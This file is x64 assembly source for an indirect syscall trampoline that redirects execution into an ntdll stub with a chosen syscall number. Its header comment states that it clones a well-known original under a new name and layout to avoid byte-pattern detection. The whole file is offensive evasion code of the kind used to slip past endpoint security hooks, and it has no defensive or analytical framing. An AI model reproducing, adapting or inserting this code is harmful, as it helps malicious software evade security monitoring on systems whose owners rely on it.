    .intel_syntax noprefix

    #
    # gate_x64.S — Indirect syscall trampoline.
    #
    # Replaces GateTrampoline64.s with identical logic but a
    # different symbol name (sc_gate) and layout to avoid
    # byte-pattern matching against the well-known original.
    #
    # Called from sc_stub(sc_entry_t *entry, ...).
    # The entry pointer sits in the shadow space at [rsp+0x10]
    # after the compiler-generated CALL pushes the return address.
    #
    # sc_entry_t layout:
    #   +0x00  hash       (DWORD)
    #   +0x04  nargs      (DWORD)
    #   +0x08  number     (DWORD)
    #   +0x0C  (padding)  (DWORD — natural alignment on x64)
    #   +0x10  trampoline (QWORD)
    #

    .global sc_gate

    .text

sc_gate:
    push r11
    push r12
    push r13

    add  rsp, 0x40              # unwind to caller's frame
    mov  r11, [rsp + 0x10]     # r11 = sc_entry_t* (shadow space)

    mov  r10, [r11 + 0x10]     # trampoline address
    mov  [rsp], r10            # overwrite return address → ret into ntdll

    # Shift arguments: drop entry*, slide everything left by one
    mov  rcx, rdx
    mov  rdx, r8
    mov  r8,  r9
    mov  r9,  [rsp + 0x30]

    # Handle extra stack arguments (>4)
    xor  r12, r12
    mov  r12d, dword ptr [r11 + 4]   # nargs
    cmp  r12, 4
    jle  .Ldone
    sub  r12, 4
    xor  r13, r13

.Lshift:
    mov  r10, [rsp + 0x38 + 8*r13]
    mov  [rsp + 0x30 + 8*r13], r10
    inc  r13
    cmp  r13, r12
    jl   .Lshift

.Ldone:
    mov  r10, rcx              # NT convention: r10 = first arg
    xor  eax, eax
    mov  eax, dword ptr [r11 + 8]    # syscall number

    # Restore callee-saved regs from their stack slots
    mov  r13, [rsp - 0x40]
    mov  r12, [rsp - 0x38]
    mov  r11, [rsp - 0x30]
    ret                        # → lands inside ntdll stub (indirect syscall)
